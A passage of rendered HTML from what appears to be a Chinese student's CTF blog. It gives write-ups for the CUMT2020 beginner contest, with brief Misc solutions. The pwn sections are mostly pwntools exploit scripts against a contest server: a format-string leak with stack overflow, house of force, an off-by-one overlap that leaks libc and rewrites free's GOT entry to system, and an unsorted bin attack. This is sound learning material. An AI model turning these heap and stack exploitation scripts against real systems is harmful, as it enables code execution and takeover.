r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = heap.got[<span class="string">'free'</span>]</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'AAAA'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'AAAA'</span>) <span class="comment">#1</span></span><br><span class="line">change(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x20</span>) + p64(heap.got[<span class="string">'free'</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr -libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr:'</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">change(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>先说一下思路</p>
<ul>
<li>单字节溢出，我们可以通过修改chunk_size来overlap，达到任意读写的目的</li>
<li>由于后门函数没有，所以我们就应该想调用system函数，首要的就是泄露libc基址，其次获取system函数</li>
<li>改free的got表 达到调用</li>
</ul>
<p>这里来写一下exp的思路</p>
<ol>
<li>先申请两个堆块，之后修改第一个堆块，第一个堆块可以写入/bin/sh的参数，然后我们修改第二个堆块的size，使其进入fastbin中，让我们再次分配</li>
<li>我们进行重新分配，这是就可以任意写，把got表中的free写进去，然后读出来，泄露基址</li>
<li>修改free的got表为system的地址然后直接free(0)也就调用了/bin/sh</li>
</ol>
<p>下面是关键截图</p>
<p>写入/bin/sh</p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220211422639.png" alt="image-20201220211422639"></p>
<p>释放1之后</p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220211752814.png" alt="image-20201220211752814"></p>
</blockquote>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>这里说一下我自己的问题</p>
<p>我一直认为fakechunk被释放后进入fastbin中，我一直认为fastbin中只有一个chunk</p>
<p>知道我惊人地发现它居然是free了两回是两个chunk </p>
<p>我才醒悟</p>
<p>为什么它不直接从top chunk中分配（我个fw，盯着看了两个小时也没看出来）</p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220223150743.png" alt="image-20201220223150743"></p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220223239931.png" alt="image-20201220223239931"></p>
<p>总结，自己总是在自己想这个堆怎么运行，很少去调试。还是应该多动手（要不是我调试能力不太行）</p>
<h1 id="pwn7"><a href="#pwn7" class="headerlink" title="pwn7"></a>pwn7</h1><blockquote>
<p>很简单的unsorted bin attack,利用此攻击修改flag为一个很大的数就可以获得shell了</p>
<p>关于unsorted bin attack可以参考这篇文章</p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10016</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#def show(idx):</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline("3")</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline(str(idx))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x6020a0</span></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = flag - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x20</span> + <span class="number">0x20</span>, <span class="string">"a"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk))</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"666"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="pwn8"><a href="#pwn8" class="headerlink" title="pwn8"></a>pwn8</h1><blockquote>
<p>add申请的时候,如果size不符合条件,会返回,而edit的时候,没有检测,所以通过残留信息来控制指针,实现</p>
<p>任意写</p>
</blockquote>

        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2020/11/28/CUMT2020%E5%85%A5%E9%97%A8%E8%B5%9B/">CUMT2020入门赛</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2020-11-28
        </span><span class="post-category">
            <a href="/categories/wp/">wp</a>
            </span>
        <span class="post-visits"
             data-url="/2020/11/28/CUMT2020%E5%85%A5%E9%97%A8%E8%B5%9B/"
             data-title="CUMT2020入门赛">
          Visits 0
        </span>
        </div>
    </header>

    <div class="post-content"><a id="more"></a>
<h1 id="CUMT2020入门赛"><a href="#CUMT2020入门赛" class="headerlink" title="CUMT2020入门赛"></a>CUMT2020入门赛</h1><p>本不准备写的，主要tcl，还是留个坑位等考完试来复现</p>
<p>主要对堆不理解，并且不懂漏洞利用点在哪里</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h3><p>nc连接拿flag</p>
<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwnlib <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwnlib <span class="keyword">import</span> context</span><br><span class="line"><span class="keyword">from</span> pwnlib.tubes.remote <span class="keyword">import</span> remote</span><br><span class="line"><span class="keyword">from</span> pwnlib.tubes.process <span class="keyword">import</span> process</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwnlib.elf.elf <span class="keyword">import</span> ELF</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> make_packer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = make_packer(word_size=<span class="number">64</span>)</span><br><span class="line">bd = <span class="number">0x400756</span></span><br><span class="line"><span class="comment">#r = process("./overflow")</span></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10011</span>)</span><br><span class="line">r.recvuntil(<span class="string">b'Welcome to CTF2020!\n'</span>)</span><br><span class="line">r.recvuntil(<span class="string">b'Please input your username\n'</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b'%11$p'</span>)</span><br><span class="line">pp = r.recv()</span><br><span class="line">print(pp)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b'a'</span>*<span class="number">0x28</span> + p(int(pp, <span class="number">16</span>)) + <span class="string">b'a'</span>*<span class="number">8</span> + p(<span class="number">0x400756</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><p>栈溢出</p>
<h3 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h3><p>整数溢出</p>
<p>输入65536</p>
<p>得到shell</p>
<h3 id="pwn5-fail"><a href="#pwn5-fail" class="headerlink" title="pwn5(fail)"></a>pwn5(fail)</h3><p>先贴exp，考完试来学习</p>
<p>漏洞点想的是一样的</p>
<p>但其中有些细节不太懂</p>
<blockquote>
<p>利用change函数中存在的任意字节堆溢出构造house of force攻击</p>
<p>关于house of force不懂得的可以参考这篇文章</p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10014</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400D1B</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"ddaa"</span>)</span><br><span class="line">payload = <span class="number">0x30</span> * <span class="string">'a'</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x41</span>,payload)</span><br><span class="line">offset_to_heap_base = -(<span class="number">0x40</span> + <span class="number">0x20</span>)</span><br><span class="line">malloc = offset_to_heap_base - <span class="number">0x8</span> - <span class="number">0xf</span></span><br><span class="line">add(malloc,<span class="string">"dddd"</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(magic) * <span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line">print(r.recv())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="pwn6-fail"><a href="#pwn6-fail" class="headerlink" title="pwn6(fail)"></a>pwn6(fail)</h3><blockquote>
<p>change函数中存在单字节溢出漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;if ( heap[v1] ) </span><br><span class="line">&gt;&#123; 	printf(&quot;Content of heap : &quot;);</span><br><span class="line">	read_input(heap[v1][1], *heap[v1] + 1LL);</span><br><span class="line">	puts(&quot;Done !&quot;); </span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure>
<p>利用单字节溢出漏洞构造fake_chunk,free之后再次分配造成overlap,从而任意地址读写</p>
<p>泄露出libc基地址，修改got表，最后get_shell</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10015</span>)</span><br><span class="line">heap = ELF(<span class="string">'./pwn6'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = heap.got[<span class="string">'free'</span>]</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'AAAA'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'AAAA'</span>) <span class="comment">#1</span></span><br><span class="line">change(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x20</span>) + p64(heap.got[<span class="string">'free'</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr -libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr:'</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">change(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="pwn7-fail"><a href="#pwn7-fail" class="headerlink" title="pwn7(fail)"></a>pwn7(fail)</h3><blockquote>
<p>很简单的unsorted bin attack,利用此攻击修改flag为一个很大的数就可以获得shell了</p>
<p>关于unsorted bin attack可以参考这篇文章</p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10016</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#def show(idx):</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline("3")</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline(str(idx))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x6020a0</span></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = flag - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x20</span> + <span class="number">0x20</span>, <span class="string">"a"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk))</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"666"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="pwn8-fail"><a href="#pwn8-fail" class="headerlink" title="pwn8(fail)"></a>pwn8(fail)</h3><blockquote>
<p>add申请的时候,如果size不符合条件,会返回,而edit的时候,没有检测,所以通过残留信息来控制指针,实现</p>
<p>任意写</p>
</blockquote>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="MISC签到题"><a href="#MISC签到题" class="headerlink" title="MISC签到题"></a>MISC签到题</h3><p>ook解码</p>
<h3 id="双重洗脑"><a href="#双重洗脑" class="headerlink" title="双重洗脑"></a>双重洗脑</h3><p>与佛论禅+社会主义价值观</p>
<h3 id="真·签到"><a href="#真·签到" class="headerlink" title="真·签到"></a>真·签到</h3><p>加qq拍一拍</p>
<h3 id="猜猜可莉把flag藏到哪了"><a href="#猜猜可莉把flag藏到哪了" class="headerlink" title="猜猜可莉把flag藏到哪了"></a>猜猜可莉把flag藏到哪了</h3><p>脱进010，直接盲文解密</p>
<h3 id="7的意志！"><a href="#7的意志！" class="headerlink" title="7的意志！"></a>7的意志！</h3><p>压缩包密码7</p>
<p>栅栏加凯撒</p>
<h3 id="奇怪的题"><a href="#奇怪的题" class="headerlink" title="奇怪的题"></a>奇怪的题</h3><p>改像素可以得到一张散开的二维码</p>
<p>把三个拼一个二维码</p>
<p>补三个定位符</p>

        </div></article>
      <article class="post">
    <header class="post-header">
